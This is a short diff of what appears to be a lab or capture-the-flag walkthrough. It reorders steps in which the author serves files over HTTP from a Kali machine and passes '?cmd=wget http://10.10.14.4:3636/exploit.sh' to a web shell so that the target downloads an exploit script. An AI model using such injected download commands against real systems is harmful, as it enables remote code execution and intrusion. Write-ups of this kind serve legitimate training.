@@ -808,14 +808,13 @@ Alright, let’s go RCE it!!!
 ```
 
 ```bash
-?cmd=wget http://10.10.14.4:3636/exploit.sh
-```
-
-```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ python3 -m http.server 3636
 Serving HTTP on 0.0.0.0 port 3636 (http://0.0.0.0:3636/) ...
-10.13.37.15 - - [20/Aug/2025 09:49:09] "GET /exploit.sh HTTP/1.1" 200 -
+```
+
+```bash
+?cmd=wget http://10.10.14.4:3636/exploit.sh
 ```
 
 ```bash
